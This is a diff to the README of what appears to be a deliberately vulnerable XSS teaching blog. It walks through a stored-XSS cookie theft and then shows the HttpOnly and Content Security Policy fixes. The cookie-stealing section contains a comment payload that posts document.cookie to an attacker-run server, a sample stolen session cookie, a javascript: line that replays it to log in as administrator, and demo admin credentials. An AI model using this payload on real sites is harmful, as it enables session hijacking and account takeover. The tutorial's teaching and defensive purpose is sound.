@@ -150,22 +150,169 @@ In the *Reflected XSS* example the code is also sent by the server but since
 the browser has the data you just injected in the URL it is able to search for
 that data in the returned content and *guesses* that you are being attacked.
 
+
 Cookie stealing
 ---------------
 
-TODO
+Now a more complete example. We are assuming two participants: An administrator
+(the victim) and an attacker. If you want to try this example on your own it is
+best to use two different browsers or different sessions of the same browser
+(e.g. private mode).
+
+
+### 1. Attacker
+
+The attacker first starts the script **hacker_server.py**:
+
+```bash
+./scripts/hacker_server.py
+```
+
+This script is a simple HTTP server that will receive data from the hacked site
+and print it on the console.
+
+Check your IP address (**ifconfig** command on Linux) and remember this value
+along with the port 8000 (where the hacker_server is running).
+
+Then go to the *XSS Demo* site (for this the Administrator has to tell you the
+IP address of his machine).
+
+http://<BLOG-IP>:6543
+
+Open any of the blog post and post a comment with following content:
+
+```html
+Very interesting article!
+<script>
+$.post('http://<HACKER-SERVER-IP>:8000/cookie', {username: 'Administrator', cookie: document.cookie});
+</script>
+```
+
+If both the site and the *hacker server* are running on your machine you can
+use **localhost* as IP address in both cases.
+
+
+### 2. Administrator
+
+The administrator logs into the application:
+
+http://localhost:6543/login
+Username: administrator
+Password: top-secret
+
+You can check that you are correctly logged in by creating a new blog post. You
+can see the cookie created by the application in yours browsers Developer
+Console. This cookie is sent by the browser to the server in every request to
+authenticate you as the administrator. This means anyone who has this cookie
+will be able to execute all administrator actions (such as creating a new blog
+post). That is why the cookie needs to be kept secret. We will see how the
+attacker can steal the cookie using XSS.
+
+Now navigate to the blogpost that the attacker compromised (by adding an
+*infected* comment). Thats it! The attacker has received your cookie and you
+didn't even notice.
+
+
+### 3. Attacker
+
+Check the output of the console where the *hacker_server* is running and you should see something like this:
+
+```
+Data sent from: http://<BLOG-IP>:6543/post/2 at 2016-03-13 11:08:52.000745
+Administrator has cookie with value:
+auth_tkt=c78de49ca2ad3789d5531cbcce7f509956e539acQWRtaW5pc3RyYXRvcg%3D%3D!userid_type:b64unicode
+```
+
+Simply set this cookie in your browser when accessing the site and you will be logged in as administrator.
+
+This can be done in Google Chrome by navigating to the site and typing the following into the address bar:
+
+```
+javascript:document.cookie="auth_tkt=c78de49ca2ad3789d5531cbcce7f509956e539acQWRtaW5pc3RyYXRvcg%3D%3D!userid_type:b64unicode"
+```
+
+Then return to the site and voilà you are logged in.
 
 
 HttpOnly
 --------
 
-TODO
+There are plenty of possible attacks you can perform with XSS (e.g. replace the
+login form so that all data is sent to your *hacker server*) but this
+particular cookie stealing was only possible because the Cookie was not marked
+as **HttpOnly**.
+
+In general you should always mark your Cookies as HttpOnly because usually you
+don't need to access the cookies from JavaScript. While you need to make sure
+that there are no XSS vulnerabilities in your site this way you also avoid
+cookie stealing in case you missed something. This approach is generally known
+as *defense in depth*. In case one layer of security fails you have other
+layers in place to protect you.
+
+In this particular application you can enable HttpOnly cookies by opening
+**app/xss_demo_/__init__.py** and replacing:
+
+```python
+authn_policy = AuthTktAuthenticationPolicy(secret)
+```
+
+with
+
+```python
+authn_policy = AuthTktAuthenticationPolicy(secret, http_only=True)
+```
+
+Now restart the blog server and try the cookie stealing attack described above.
+It will no longer work.
 
 
 CSP Content Security Policies
 -----------------------------
 
-TODO
+Content Security Policy is a security standard introduced in 2004 and is now
+widely supported in modern browsers. Its purpose is to prevent XSS and similar
+attacks.
+
+It works by informing the browser what scripts (and fonts etc.) are allowed to
+be executed, where they are allowed to be loaded from and what connections are
+allowed. This is done by a special HTTP header set by the server.
+
+You can test it by editing the **post** view in **app/xss_demo/views.py**:
+
+```python
+@view_config(route_name='post', renderer='templates/post.pt')
+def post(request):
+    post_id = int(request.matchdict['id'])
+    post = DB.get(Post, post_id)
+    ...
+```
+
+Simply add a call to the **_add_csp_header_hard** method:
+
+```python
+@view_config(route_name='post', renderer='templates/post.pt')
+def post(request):
+    _add_csp_header_hard(request)
+    post_id = int(request.matchdict['id'])
+    post = DB.get(Post, post_id)
+    ...
+```
+
+Not reload the blog application and try opening a single blogpost in the
+browser. You will see a *broken* page because several stylesheets, scripts and
+fonts need to be loaded from external CDNs.
+
+You can also open your browsers Developer Console to see the reason your
+browsers is blocking this content.
+
+Replace the **_add_csp_header_hard** call with **_add_csp_header** and the page
+will work.
+
+Reload the server and try the cookie stealing attack from above. It will fail.
+
+Ideally you should strive to remove *unsafe-inline* from the CSP header because
+then you are a lot safer from XSS attacks (even if you have XSS vulnerabilities
+in the application).
 
 
 Links & Acknowledgements
